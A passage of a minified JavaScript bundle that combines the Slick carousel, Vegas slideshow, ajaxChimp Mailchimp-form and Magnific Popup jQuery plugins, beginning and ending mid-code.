            })) : c.postSlide(s))) : (c.options.autoplay && clearInterval(c.autoPlayTimer), n = 0 > s ? c.slideCount % c.options.slidesToScroll != 0 ? c.slideCount - c.slideCount % c.options.slidesToScroll : c.slideCount + s : s >= c.slideCount ? c.slideCount % c.options.slidesToScroll != 0 ? 0 : s - c.slideCount : s, c.animating = !0, c.$slider.trigger("beforeChange", [c, c.currentSlide, n]), o = c.currentSlide, c.currentSlide = n, c.setSlideClasses(c.currentSlide), c.options.asNavFor && ((a = (a = c.getNavTarget()).slick("getSlick")).slideCount <= a.options.slidesToShow && a.setSlideClasses(c.currentSlide)), c.updateDots(), c.updateArrows(), !0 === c.options.fade ? (!0 !== i ? (c.fadeSlideOut(o), c.fadeSlide(n, (function() {
                c.postSlide(n)
            }))) : c.postSlide(n), void c.animateHeight()) : void(!0 !== i ? c.animateSlide(l, (function() {
                c.postSlide(n)
            })) : c.postSlide(n))))
        }, e.prototype.startLoad = function() {
            var t = this;
            !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.hide(), t.$nextArrow.hide()), !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.hide(), t.$slider.addClass("slick-loading")
        }, e.prototype.swipeDirection = function() {
            var t, e, i, s, n = this;
            return t = n.touchObject.startX - n.touchObject.curX, e = n.touchObject.startY - n.touchObject.curY, i = Math.atan2(e, t), 0 > (s = Math.round(180 * i / Math.PI)) && (s = 360 - Math.abs(s)), 45 >= s && s >= 0 || 360 >= s && s >= 315 ? !1 === n.options.rtl ? "left" : "right" : s >= 135 && 225 >= s ? !1 === n.options.rtl ? "right" : "left" : !0 === n.options.verticalSwiping ? s >= 35 && 135 >= s ? "down" : "up" : "vertical"
        }, e.prototype.swipeEnd = function(t) {
            var e, i, s = this;
            if (s.dragging = !1, s.interrupted = !1, s.shouldClick = !(s.touchObject.swipeLength > 10), void 0 === s.touchObject.curX) return !1;
            if (!0 === s.touchObject.edgeHit && s.$slider.trigger("edge", [s, s.swipeDirection()]), s.touchObject.swipeLength >= s.touchObject.minSwipe) {
                switch (i = s.swipeDirection()) {
                    case "left":
                    case "down":
                        e = s.options.swipeToSlide ? s.checkNavigable(s.currentSlide + s.getSlideCount()) : s.currentSlide + s.getSlideCount(), s.currentDirection = 0;
                        break;
                    case "right":
                    case "up":
                        e = s.options.swipeToSlide ? s.checkNavigable(s.currentSlide - s.getSlideCount()) : s.currentSlide - s.getSlideCount(), s.currentDirection = 1
                }
                "vertical" != i && (s.slideHandler(e), s.touchObject = {}, s.$slider.trigger("swipe", [s, i]))
            } else s.touchObject.startX !== s.touchObject.curX && (s.slideHandler(s.currentSlide), s.touchObject = {})
        }, e.prototype.swipeHandler = function(t) {
            var e = this;
            if (!(!1 === e.options.swipe || "ontouchend" in document && !1 === e.options.swipe || !1 === e.options.draggable && -1 !== t.type.indexOf("mouse"))) switch (e.touchObject.fingerCount = t.originalEvent && void 0 !== t.originalEvent.touches ? t.originalEvent.touches.length : 1, e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold, !0 === e.options.verticalSwiping && (e.touchObject.minSwipe = e.listHeight / e.options.touchThreshold), t.data.action) {
                case "start":
                    e.swipeStart(t);
                    break;
                case "move":
                    e.swipeMove(t);
                    break;
                case "end":
                    e.swipeEnd(t)
            }
        }, e.prototype.swipeMove = function(t) {
            var e, i, s, n, o, r = this;
            return o = void 0 !== t.originalEvent ? t.originalEvent.touches : null, !(!r.dragging || o && 1 !== o.length) && (e = r.getLeft(r.currentSlide), r.touchObject.curX = void 0 !== o ? o[0].pageX : t.clientX, r.touchObject.curY = void 0 !== o ? o[0].pageY : t.clientY, r.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(r.touchObject.curX - r.touchObject.startX, 2))), !0 === r.options.verticalSwiping && (r.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(r.touchObject.curY - r.touchObject.startY, 2)))), "vertical" !== (i = r.swipeDirection()) ? (void 0 !== t.originalEvent && r.touchObject.swipeLength > 4 && t.preventDefault(), n = (!1 === r.options.rtl ? 1 : -1) * (r.touchObject.curX > r.touchObject.startX ? 1 : -1), !0 === r.options.verticalSwiping && (n = r.touchObject.curY > r.touchObject.startY ? 1 : -1), s = r.touchObject.swipeLength, r.touchObject.edgeHit = !1, !1 === r.options.infinite && (0 === r.currentSlide && "right" === i || r.currentSlide >= r.getDotCount() && "left" === i) && (s = r.touchObject.swipeLength * r.options.edgeFriction, r.touchObject.edgeHit = !0), !1 === r.options.vertical ? r.swipeLeft = e + s * n : r.swipeLeft = e + s * (r.$list.height() / r.listWidth) * n, !0 === r.options.verticalSwiping && (r.swipeLeft = e + s * n), !0 !== r.options.fade && !1 !== r.options.touchMove && (!0 === r.animating ? (r.swipeLeft = null, !1) : void r.setCSS(r.swipeLeft))) : void 0)
        }, e.prototype.swipeStart = function(t) {
            var e, i = this;
            return i.interrupted = !0, 1 !== i.touchObject.fingerCount || i.slideCount <= i.options.slidesToShow ? (i.touchObject = {}, !1) : (void 0 !== t.originalEvent && void 0 !== t.originalEvent.touches && (e = t.originalEvent.touches[0]), i.touchObject.startX = i.touchObject.curX = void 0 !== e ? e.pageX : t.clientX, i.touchObject.startY = i.touchObject.curY = void 0 !== e ? e.pageY : t.clientY, void(i.dragging = !0))
        }, e.prototype.unfilterSlides = e.prototype.slickUnfilter = function() {
            var t = this;
            null !== t.$slidesCache && (t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.appendTo(t.$slideTrack), t.reinit())
        }, e.prototype.unload = function() {
            var e = this;
            t(".slick-cloned", e.$slider).remove(), e.$dots && e.$dots.remove(), e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(), e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(), e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
        }, e.prototype.unslick = function(t) {
            var e = this;
            e.$slider.trigger("unslick", [e, t]), e.destroy()
        }, e.prototype.updateArrows = function() {
            var t = this;
            Math.floor(t.options.slidesToShow / 2), !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && !t.options.infinite && (t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === t.currentSlide ? (t.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : (t.currentSlide >= t.slideCount - t.options.slidesToShow && !1 === t.options.centerMode || t.currentSlide >= t.slideCount - 1 && !0 === t.options.centerMode) && (t.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
        }, e.prototype.updateDots = function() {
            var t = this;
            null !== t.$dots && (t.$dots.find("li").removeClass("slick-active").attr("aria-hidden", "true"), t.$dots.find("li").eq(Math.floor(t.currentSlide / t.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden", "false"))
        }, e.prototype.visibility = function() {
            var t = this;
            t.options.autoplay && (document[t.hidden] ? t.interrupted = !0 : t.interrupted = !1)
        }, t.fn.slick = function() {
            var t, i, s = this,
                n = arguments[0],
                o = Array.prototype.slice.call(arguments, 1),
                r = s.length;
            for (t = 0; r > t; t++)
                if ("object" == typeof n || void 0 === n ? s[t].slick = new e(s[t], n) : i = s[t].slick[n].apply(s[t].slick, o), void 0 !== i) return i;
            return s
        }
    })),
    function(t) {
        "use strict";
        var e = {
                slide: 0,
                delay: 5e3,
                loop: !0,
                preload: !1,
                preloadImage: !1,
                preloadVideo: !1,
                timer: !0,
                overlay: !1,
                autoplay: !0,
                shuffle: !1,
                cover: !0,
                color: null,
                align: "center",
                valign: "center",
                firstTransition: null,
                firstTransitionDuration: null,
                transition: "fade",
                transitionDuration: 1e3,
                transitionRegister: [],
                animation: null,
                animationDuration: "auto",
                animationRegister: [],
                slidesToKeep: 1,
                init: function() {},
                play: function() {},
                pause: function() {},
                walk: function() {},
                slides: []
            },
            i = {},
            s = function(i, s) {
                this.elmt = i, this.settings = t.extend({}, e, t.vegas.defaults, s), this.slide = this.settings.slide, this.total = this.settings.slides.length, this.noshow = this.total < 2, this.paused = !this.settings.autoplay || this.noshow, this.ended = !1, this.$elmt = t(i), this.$timer = null, this.$overlay = null, this.$slide = null, this.timeout = null, this.first = !0, this.transitions = ["fade", "fade2", "blur", "blur2", "flash", "flash2", "negative", "negative2", "burn", "burn2", "slideLeft", "slideLeft2", "slideRight", "slideRight2", "slideUp", "slideUp2", "slideDown", "slideDown2", "zoomIn", "zoomIn2", "zoomOut", "zoomOut2", "swirlLeft", "swirlLeft2", "swirlRight", "swirlRight2"], this.animations = ["kenburns", "kenburnsLeft", "kenburnsRight", "kenburnsUp", "kenburnsUpLeft", "kenburnsUpRight", "kenburnsDown", "kenburnsDownLeft", "kenburnsDownRight"], this.settings.transitionRegister instanceof Array == 0 && (this.settings.transitionRegister = [this.settings.transitionRegister]), this.settings.animationRegister instanceof Array == 0 && (this.settings.animationRegister = [this.settings.animationRegister]), this.transitions = this.transitions.concat(this.settings.transitionRegister), this.animations = this.animations.concat(this.settings.animationRegister), this.support = {
                    objectFit: "objectFit" in document.body.style,
                    transition: "transition" in document.body.style || "WebkitTransition" in document.body.style,
                    video: t.vegas.isVideoCompatible()
                }, !0 === this.settings.shuffle && this.shuffle(), this._init()
            };
        s.prototype = {
            _init: function() {
                var e, i, s, n = "BODY" === this.elmt.tagName,
                    o = this.settings.timer,
                    r = this.settings.overlay,
                    a = this;
                this._preload(), n || (this.$elmt.css("height", this.$elmt.css("height")), e = t('<div class="vegas-wrapper">').css("overflow", this.$elmt.css("overflow")).css("padding", this.$elmt.css("padding")), this.$elmt.css("padding") || e.css("padding-top", this.$elmt.css("padding-top")).css("padding-bottom", this.$elmt.css("padding-bottom")).css("padding-left", this.$elmt.css("padding-left")).css("padding-right", this.$elmt.css("padding-right")), this.$elmt.clone(!0).children().appendTo(e), this.elmt.innerHTML = ""), o && this.support.transition && (s = t('<div class="vegas-timer"><div class="vegas-timer-progress">'), this.$timer = s, this.$elmt.prepend(s)), r && (i = t('<div class="vegas-overlay">'), "string" == typeof r && i.css("background-image", "url(" + r + ")"), this.$overlay = i, this.$elmt.prepend(i)), this.$elmt.addClass("vegas-container"), n || this.$elmt.append(e), setTimeout((function() {
                    a.trigger("init"), a._goto(a.slide), a.settings.autoplay && a.trigger("play")
                }), 1)
            },
            _preload: function() {
                var t;
                for (t = 0; t < this.settings.slides.length; t++)(this.settings.preload || this.settings.preloadImages) && this.settings.slides[t].src && ((new Image).src = this.settings.slides[t].src), (this.settings.preload || this.settings.preloadVideos) && this.support.video && this.settings.slides[t].video && (this.settings.slides[t].video instanceof Array ? this._video(this.settings.slides[t].video) : this._video(this.settings.slides[t].video.src))
            },
            _random: function(t) {
                return t[Math.floor(Math.random() * t.length)]
            },
            _slideShow: function() {
                var t = this;
                this.total > 1 && !this.ended && !this.paused && !this.noshow && (this.timeout = setTimeout((function() {
                    t.next()
                }), this._options("delay")))
            },
            _timer: function(t) {
                var e = this;
                clearTimeout(this.timeout), this.$timer && (this.$timer.removeClass("vegas-timer-running").find("div").css("transition-duration", "0ms"), this.ended || this.paused || this.noshow || t && setTimeout((function() {
                    e.$timer.addClass("vegas-timer-running").find("div").css("transition-duration", e._options("delay") - 100 + "ms")
                }), 100))
            },
            _video: function(t) {
                var e, s, n = t.toString();
                return i[n] ? i[n] : (t instanceof Array == 0 && (t = [t]), (e = document.createElement("video")).preload = !0, t.forEach((function(t) {
                    (s = document.createElement("source")).src = t, e.appendChild(s)
                })), i[n] = e, e)
            },
            _fadeOutSound: function(t, e) {
                var i = this,
                    s = e / 10,
                    n = t.volume - .09;
                n > 0 ? (t.volume = n, setTimeout((function() {
                    i._fadeOutSound(t, e)
                }), s)) : t.pause()
            },
            _fadeInSound: function(t, e) {
                var i = this,
                    s = e / 10,
                    n = t.volume + .09;
                n < 1 && (t.volume = n, setTimeout((function() {
                    i._fadeInSound(t, e)
                }), s))
            },
            _options: function(t, e) {
                return void 0 === e && (e = this.slide), void 0 !== this.settings.slides[e][t] ? this.settings.slides[e][t] : this.settings[t]
            },
            _goto: function(e) {
                function i() {
                    v._timer(!0), setTimeout((function() {
                        y && (v.support.transition ? (l.css("transition", "all " + b + "ms").addClass("vegas-transition-" + y + "-out"), l.each((function() {
                            var t = l.find("video").get(0);
                            t && (t.volume = 1, v._fadeOutSound(t, b))
                        })), s.css("transition", "all " + b + "ms").addClass("vegas-transition-" + y + "-in")) : s.fadeIn(b));
                        for (var t = 0; t < l.length - v.settings.slidesToKeep; t++) l.eq(t).remove();
                        v.trigger("walk"), v._slideShow()
                    }), 100)
                }
                void 0 === this.settings.slides[e] && (e = 0), this.slide = e;
                var s, n, o, r, a, l = this.$elmt.children(".vegas-slide"),
                    c = this.settings.slides[e].src,
                    d = this.settings.slides[e].video,
                    h = this._options("delay"),
                    u = this._options("align"),
                    p = this._options("valign"),
                    f = this._options("cover"),
                    m = this._options("color") || this.$elmt.css("background-color"),
                    v = this,
                    g = l.length,
                    y = this._options("transition"),
                    b = this._options("transitionDuration"),
                    w = this._options("animation"),
                    x = this._options("animationDuration");
                this.settings.firstTransition && this.first && (y = this.settings.firstTransition || y), this.settings.firstTransitionDuration && this.first && (b = this.settings.firstTransitionDuration || b), this.first && (this.first = !1), "repeat" !== f && (!0 === f ? f = "cover" : !1 === f && (f = "contain")), ("random" === y || y instanceof Array) && (y = y instanceof Array ? this._random(y) : this._random(this.transitions)), ("random" === w || w instanceof Array) && (w = w instanceof Array ? this._random(w) : this._random(this.animations)), ("auto" === b || b > h) && (b = h), "auto" === x && (x = h), s = t('<div class="vegas-slide"></div>'), this.support.transition && y && s.addClass("vegas-transition-" + y), this.support.video && d ? ((r = d instanceof Array ? this._video(d) : this._video(d.src)).loop = void 0 === d.loop || d.loop, r.muted = void 0 === d.mute || d.mute, !1 === r.muted ? (r.volume = 0, this._fadeInSound(r, b)) : r.pause(), o = t(r).addClass("vegas-video").css("background-color", m), this.support.objectFit ? o.css("object-position", u + " " + p).css("object-fit", f).css("width", "100%").css("height", "100%") : "contain" === f && o.css("width", "100%").css("height", "100%"), s.append(o)) : (a = new Image, n = t('<div class="vegas-slide-inner"></div>').css("background-image", 'url("' + c + '")').css("background-color", m).css("background-position", u + " " + p), "repeat" === f ? n.css("background-repeat", "repeat") : n.css("background-size", f), this.support.transition && w && n.addClass("vegas-animation-" + w).css("animation-duration", x + "ms"), s.append(n)), this.support.transition || s.css("display", "none"), g ? l.eq(g - 1).after(s) : this.$elmt.prepend(s), l.css("transition", "all 0ms").each((function() {
                    this.className = "vegas-slide", "VIDEO" === this.tagName && (this.className += " vegas-video"), y && (this.className += " vegas-transition-" + y, this.className += " vegas-transition-" + y + "-in")
                })), v._timer(!1), r ? (4 === r.readyState && (r.currentTime = 0), r.play(), i()) : (a.src = c, a.complete ? i() : a.onload = i)
            },
            _end: function() {
                this.ended = !0, this._timer(!1), this.trigger("end")
            },
            shuffle: function() {
                for (var t, e, i = this.total - 1; i > 0; i--) e = Math.floor(Math.random() * (i + 1)), t = this.settings.slides[i], this.settings.slides[i] = this.settings.slides[e], this.settings.slides[e] = t
            },
            play: function() {
                this.paused && (this.paused = !1, this.next(), this.trigger("play"))
            },
            pause: function() {
                this._timer(!1), this.paused = !0, this.trigger("pause")
            },
            toggle: function() {
                this.paused ? this.play() : this.pause()
            },
            playing: function() {
                return !this.paused && !this.noshow
            },
            current: function(t) {
                return t ? {
                    slide: this.slide,
                    data: this.settings.slides[this.slide]
                } : this.slide
            },
            jump: function(t) {
                t < 0 || t > this.total - 1 || t === this.slide || (this.slide = t, this._goto(this.slide))
            },
            next: function() {
                if (this.slide++, this.slide >= this.total) {
                    if (!this.settings.loop) return this._end();
                    this.slide = 0
                }
                this._goto(this.slide)
            },
            previous: function() {
                if (this.slide--, this.slide < 0) {
                    if (!this.settings.loop) return void this.slide++;
                    this.slide = this.total - 1
                }
                this._goto(this.slide)
            },
            trigger: function(t) {
                var e;
                e = "init" === t ? [this.settings] : [this.slide, this.settings.slides[this.slide]], this.$elmt.trigger("vegas" + t, e), "function" == typeof this.settings[t] && this.settings[t].apply(this.$elmt, e)
            },
            options: function(i, s) {
                var n = this.settings.slides.slice();
                if ("object" == typeof i) this.settings = t.extend({}, e, t.vegas.defaults, i);
                else {
                    if ("string" != typeof i) return this.settings;
                    if (void 0 === s) return this.settings[i];
                    this.settings[i] = s
                }
                this.settings.slides !== n && (this.total = this.settings.slides.length, this.noshow = this.total < 2, this._preload())
            },
            destroy: function() {
                clearTimeout(this.timeout), this.$elmt.removeClass("vegas-container"), this.$elmt.find("> .vegas-slide").remove(), this.$elmt.find("> .vegas-wrapper").clone(!0).children().appendTo(this.$elmt), this.$elmt.find("> .vegas-wrapper").remove(), this.settings.timer && this.$timer.remove(), this.settings.overlay && this.$overlay.remove(), this.elmt._vegas = null
            }
        }, t.fn.vegas = function(t) {
            var e, i = arguments,
                n = !1;
            if (void 0 === t || "object" == typeof t) return this.each((function() {
                this._vegas || (this._vegas = new s(this, t))
            }));
            if ("string" == typeof t) {
                if (this.each((function() {
                    var s = this._vegas;
                    if (!s) throw new Error("No Vegas applied to this element.");
                    "function" == typeof s[t] && "_" !== t[0] ? e = s[t].apply(s, [].slice.call(i, 1)) : n = !0
                })), n) throw new Error('No method "' + t + '" in Vegas.');
                return void 0 !== e ? e : this
            }
        }, t.vegas = {}, t.vegas.defaults = e, t.vegas.isVideoCompatible = function() {
            return !/(Android|webOS|Phone|iPad|iPod|BlackBerry|Windows Phone)/i.test(navigator.userAgent)
        }
    }(window.jQuery || window.Zepto),
    function(t) {
        "use strict";
        t.ajaxChimp = {
            responses: {
                "We have sent you a confirmation email": 0,
                "Please enter a value": 1,
                "An email address must contain a single @": 2,
                "The domain portion of the email address is invalid (the portion after the @: )": 3,
                "The username portion of the email address is invalid (the portion before the @: )": 4,
                "This email address looks fake or invalid. Please enter a real email address": 5
            },
            translations: {
                en: null
            },
            init: function(e, i) {
                t(e).ajaxChimp(i)
            }
        }, t.fn.ajaxChimp = function(e) {
            return t(this).each((function(i, s) {
                var n = t(s),
                    o = n.find("input[type=email]"),
                    r = n.find("label[for=" + o.attr("id") + "]"),
                    a = t.extend({
                        url: n.attr("action"),
                        language: "en"
                    }, e),
                    l = a.url.replace("/post?", "/post-json?").concat("&c=?");
                n.attr("novalidate", "true"), o.attr("name", "EMAIL"), n.submit((function() {
                    var e;
                    var i = {},
                        s = n.serializeArray();
                    t.each(s, (function(t, e) {
                        i[e.name] = e.value
                    })), t.ajax({
                        url: l,
                        data: i,
                        success: function(i) {
                            if ("success" === i.result) e = "We have sent you a confirmation email", r.removeClass("error").addClass("valid"), o.removeClass("error").addClass("valid");
                            else {
                                o.removeClass("valid").addClass("error"), r.removeClass("valid").addClass("error");
                                try {
                                    var s = i.msg.split(" - ", 2);
                                    if (void 0 === s[1]) e = i.msg;
                                    else parseInt(s[0], 10).toString() === s[0] ? (s[0], e = s[1]) : (-1, e = i.msg)
                                } catch (t) {
                                    -1, e = i.msg
                                }
                            }
                            "en" !== a.language && void 0 !== t.ajaxChimp.responses[e] && t.ajaxChimp.translations && t.ajaxChimp.translations[a.language] && t.ajaxChimp.translations[a.language][t.ajaxChimp.responses[e]] && (e = t.ajaxChimp.translations[a.language][t.ajaxChimp.responses[e]]), r.html(e), r.show(2e3), a.callback && a.callback(i)
                        },
                        dataType: "jsonp",
                        error: function(t, e) {
                            console.log("mailchimp ajax submit error: " + e)
                        }
                    });
                    var c = "Submitting...";
                    return "en" !== a.language && t.ajaxChimp.translations && t.ajaxChimp.translations[a.language] && t.ajaxChimp.translations[a.language].submit && (c = t.ajaxChimp.translations[a.language].submit), r.html(c).show(2e3), !1
                }))
            })), this
        }
    }(jQuery),
    function(t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof exports ? require("jquery") : window.jQuery || window.Zepto)
    }((function(t) {
        var e, i, s, n, o, r, a = "Close",
            l = "BeforeClose",
            c = "MarkupParse",
            d = "Open",
            h = "Change",
            u = "mfp",
            p = "." + u,
            f = "mfp-ready",
            m = "mfp-removing",
            v = "mfp-prevent-close",
            g = function() {},
            y = !!window.jQuery,
            b = t(window),
            w = function(t, i) {
                e.ev.on(u + t + p, i)
            },
            x = function(e, i, s, n) {
                var o = document.createElement("div");
                return o.className = "mfp-" + e, s && (o.innerHTML = s), n ? i && i.appendChild(o) : (o = t(o), i && o.appendTo(i)), o
            },
            S = function(i, s) {
                e.ev.triggerHandler(u + i, s), e.st.callbacks && (i = i.charAt(0).toLowerCase() + i.slice(1), e.st.callbacks[i] && e.st.callbacks[i].apply(e, t.isArray(s) ? s : [s]))
            },
            k = function(i) {
                return i === r && e.currTemplate.closeBtn || (e.currTemplate.closeBtn = t(e.st.closeMarkup.replace("%title%", e.st.tClose)), r = i), e.currTemplate.closeBtn
            },
            T = function() {
                t.magnificPopup.instance || ((e = new g).init(), t.magnificPopup.instance = e)
            };
        g.prototype = {
            constructor: g,
            init: function() {
                var i = navigator.appVersion;
                e.isLowIE = e.isIE8 = document.all && !document.addEventListener, e.isAndroid = /android/gi.test(i), e.isIOS = /iphone|ipad|ipod/gi.test(i), e.supportsTransition = function() {
                    var t = document.createElement("p").style,
                        e = ["ms", "O", "Moz", "Webkit"];
                    if (void 0 !== t.transition) return !0;
                    for (; e.length;)
                        if (e.pop() + "Transition" in t) return !0;
                    return !1
                }(), e.probablyMobile = e.isAndroid || e.isIOS || /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent), s = t(document), e.popupsCache = {}
            },
            open: function(i) {
                var n;
                if (!1 === i.isObj) {
                    e.items = i.items.toArray(), e.index = 0;
                    var r, a = i.items;
                    for (n = 0; n < a.length; n++)
                        if ((r = a[n]).parsed && (r = r.el[0]), r === i.el[0]) {
                            e.index = n;
                            break
                        }
                } else e.items = t.isArray(i.items) ? i.items : [i.items], e.index = i.index || 0;
                if (!e.isOpen) {
                    e.types = [], o = "", i.mainEl && i.mainEl.length ? e.ev = i.mainEl.eq(0) : e.ev = s, i.key ? (e.popupsCache[i.key] || (e.popupsCache[i.key] = {}), e.currTemplate = e.popupsCache[i.key]) : e.currTemplate = {}, e.st = t.extend(!0, {}, t.magnificPopup.defaults, i), e.fixedContentPos = "auto" === e.st.fixedContentPos ? !e.probablyMobile : e.st.fixedContentPos, e.st.modal && (e.st.closeOnContentClick = !1, e.st.closeOnBgClick = !1, e.st.showCloseBtn = !1, e.st.enableEscapeKey = !1), e.bgOverlay || (e.bgOverlay = x("bg").on("click" + p, (function() {
                        e.close()
                    })), e.wrap = x("wrap").attr("tabindex", -1).on("click" + p, (function(t) {
                        e._checkIfClose(t.target) && e.close()
                    })), e.container = x("container", e.wrap)), e.contentContainer = x("content"), e.st.preloader && (e.preloader = x("preloader", e.container, e.st.tLoading));
                    var l = t.magnificPopup.modules;
                    for (n = 0; n < l.length; n++) {
                        var h = l[n];
                        h = h.charAt(0).toUpperCase() + h.slice(1), e["init" + h].call(e)
                    }
                    S("BeforeOpen"), e.st.showCloseBtn && (e.st.closeBtnInside ? (w(c, (function(t, e, i, s) {
                        i.close_replaceWith = k(s.type)
                    })), o += " mfp-close-btn-in") : e.wrap.append(k())), e.st.alignTop && (o += " mfp-align-top"), e.fixedContentPos ? e.wrap.css({
                        overflow: e.st.overflowY,
                        overflowX: "hidden",
                        overflowY: e.st.overflowY
                    }) : e.wrap.css({
                        top: b.scrollTop(),
                        position: "absolute"
                    }), (!1 === e.st.fixedBgPos || "auto" === e.st.fixedBgPos && !e.fixedContentPos) && e.bgOverlay.css({
                        height: s.height(),
                        position: "absolute"
                    }), e.st.enableEscapeKey && s.on("keyup" + p, (function(t) {
                        27 === t.keyCode && e.close()
                    })), b.on("resize" + p, (function() {
                        e.updateSize()
                    })), e.st.closeOnContentClick || (o += " mfp-auto-cursor"), o && e.wrap.addClass(o);
                    var u = e.wH = b.height(),
                        m = {};
                    if (e.fixedContentPos && e._hasScrollBar(u)) {
                        var v = e._getScrollbarSize();
                        v && (m.marginRight = v)
                    }
                    e.fixedContentPos && (e.isIE7 ? t("body, html").css("overflow", "hidden") : m.overflow = "hidden");
                    var g = e.st.mainClass;
                    return e.isIE7 && (g += " mfp-ie7"), g && e._addClassToMFP(g), e.updateItemHTML(), S("BuildControls"), t("html").css(m), e.bgOverlay.add(e.wrap).prependTo(e.st.prependTo || t(document.body)), e._lastFocusedEl = document.activeElement, setTimeout((function() {
                        e.content ? (e._addClassToMFP(f), e._setFocus()) : e.bgOverlay.addClass(f), s.on("focusin" + p, e._onFocusIn)
                    }), 16), e.isOpen = !0, e.updateSize(u), S(d), i
                }
                e.updateItemHTML()
            },
            close: function() {
                e.isOpen && (S(l), e.isOpen = !1, e.st.removalDelay && !e.isLowIE && e.supportsTransition ? (e._addClassToMFP(m), setTimeout((function() {
                    e._close()
                }), e.st.removalDelay)) : e._close())
            },
            _close: function() {
                S(a);
                var i = m + " " + f + " ";
                if (e.bgOverlay.detach(), e.wrap.detach(), e.container.empty(), e.st.mainClass && (i += e.st.mainClass + " "), e._removeClassFromMFP(i), e.fixedContentPos) {
                    var n = {
                        marginRight: ""
                    };
                    e.isIE7 ? t("body, html").css("overflow", "") : n.overflow = "", t("html").css(n)
                }
                s.off("keyup.mfp focusin" + p), e.ev.off(p), e.wrap.attr("class", "mfp-wrap").removeAttr("style"), e.bgOverlay.attr("class", "mfp-bg"), e.container.attr("class", "mfp-container"), !e.st.showCloseBtn || e.st.closeBtnInside && !0 !== e.currTemplate[e.currItem.type] || e.currTemplate.closeBtn && e.currTemplate.closeBtn.detach(), e.st.autoFocusLast && e._lastFocusedEl && t(e._lastFocusedEl).focus(), e.currItem = null, e.content = null, e.currTemplate = null, e.prevHeight = 0, S("AfterClose")
            },
            updateSize: function(t) {
                if (e.isIOS) {
                    var i = document.documentElement.clientWidth / window.innerWidth,
                        s = window.innerHeight * i;
                    e.wrap.css("height", s), e.wH = s
                } else e.wH = t || b.height();
                e.fixedContentPos || e.wrap.css("height", e.wH), S("Resize")
            },
            updateItemHTML: function() {
                var i = e.items[e.index];
                e.contentContainer.detach(), e.content && e.content.detach(), i.parsed || (i = e.parseEl(e.index));
                var s = i.type;
                if (S("BeforeChange", [e.currItem ? e.currItem.type : "", s]), e.currItem = i, !e.currTemplate[s]) {
                    var o = !!e.st[s] && e.st[s].markup;
                    S("FirstMarkupParse", o), e.currTemplate[s] = !o || t(o)
                }
                n && n !== i.type && e.container.removeClass("mfp-" + n + "-holder");
                var r = e["get" + s.charAt(0).toUpperCase() + s.slice(1)](i, e.currTemplate[s]);
                e.appendContent(r, s), i.preloaded = !0, S(h, i), n = i.type, e.container.prepend(e.contentContainer), S("AfterChange")
            },
            appendContent: function(t, i) {
                e.content = t, t ? e.st.showCloseBtn && e.st.closeBtnInside && !0 === e.currTemplate[i] ? e.content.find(".mfp-close").length || e.content.append(k()) : e.content = t : e.content = "", S("BeforeAppend"), e.container.addClass("mfp-" + i + "-holder"), e.contentContainer.append(e.content)
            },
            parseEl: function(i) {
                var s, n = e.items[i];
                if (n.tagName ? n = {
                    el: t(n)
                } : (s = n.type, n = {
                    data: n,
                    src: n.src
                }), n.el) {
                    for (var o = e.types, r = 0; r < o.length; r++)
                        if (n.el.hasClass("mfp-" + o[r])) {
                            s = o[r];
                            break
                        } n.src = n.el.attr("data-mfp-src"), n.src || (n.src = n.el.attr("href"))
                }
                return n.type = s || e.st.type || "inline", n.index = i, n.parsed = !0, e.items[i] = n, S("ElementParse", n), e.items[i]
            },
            addGroup: function(t, i) {
                var s = function(s) {
                    s.mfpEl = this, e._openClick(s, t, i)
                };
                i || (i = {});
                var n = "click.magnificPopup";
                i.mainEl = t, i.items ? (i.isObj = !0, t.off(n).on(n, s)) : (i.isObj = !1, i.delegate ? t.off(n).on(n, i.delegate, s) : (i.items = t, t.off(n).on(n, s)))
            },
            _openClick: function(i, s, n) {
                if ((void 0 !== n.midClick ? n.midClick : t.magnificPopup.defaults.midClick) || !(2 === i.which || i.ctrlKey || i.metaKey || i.altKey || i.shiftKey)) {
                    var o = void 0 !== n.disableOn ? n.disableOn : t.magnificPopup.defaults.disableOn;
                    if (o)
                        if (t.isFunction(o)) {
                            if (!o.call(e)) return !0
                        } else if (b.width() < o) return !0;
                    i.type && (i.preventDefault(), e.isOpen && i.stopPropagation()), n.el = t(i.mfpEl), n.delegate && (n.items = s.find(n.delegate)), e.open(n)
                }
            },
            updateStatus: function(t, s) {
                if (e.preloader) {
                    i !== t && e.container.removeClass("mfp-s-" + i), s || "loading" !== t || (s = e.st.tLoading);
                    var n = {
                        status: t,
                        text: s
                    };
                    S("UpdateStatus", n), t = n.status, s = n.text, e.preloader.html(s), e.preloader.find("a").on("click", (function(t) {
                        t.stopImmediatePropagation()
                    })), e.container.addClass("mfp-s-" + t), i = t
                }
            },
            _checkIfClose: function(i) {
                if (!t(i).hasClass(v)) {
                    var s = e.st.closeOnContentClick,
                        n = e.st.closeOnBgClick;
                    if (s && n) return !0;
                    if (!e.content || t(i).hasClass("mfp-close") || e.preloader && i === e.preloader[0]) return !0;
                    if (i === e.content[0] || t.contains(e.content[0], i)) {
                        if (s) return !0
                    } else if (n && t.contains(document, i)) return !0;
                    return !1
                }
            },
            _addClassToMFP: function(t) {
                e.bgOverlay.addClass(t), e.wrap.addClass(t)
            },
            _removeClassFromMFP: function(t) {
                this.bgOverlay.removeClass(t), e.wrap.removeClass(t)
            },
